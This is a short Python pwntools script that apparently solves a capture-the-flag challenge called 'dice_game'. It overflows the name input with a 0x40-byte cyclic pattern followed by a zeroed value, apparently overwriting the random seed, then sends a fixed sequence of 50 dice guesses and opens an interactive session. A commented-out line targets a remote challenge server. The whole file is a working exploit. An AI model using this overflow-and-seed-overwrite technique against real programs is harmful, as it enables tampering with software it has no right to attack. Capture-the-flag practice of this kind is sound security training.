from pwn import *
from pwnlib import gdb
from ctypes import *

p = process("./dice_game")
# p = remote("111.200.241.244", "52188")
# context.terminal = ["tmux", "spiltw", "-h"]

payload = cyclic(0x40) + p64(0)
a = "25426251423232651155634433322261116425254446323361"
p.recvuntil("your name: ")
p.sendline(payload)

for i in a:
    p.recvuntil("point(1~6): ")
    p.sendline(str.encode(i))
p.interactive()
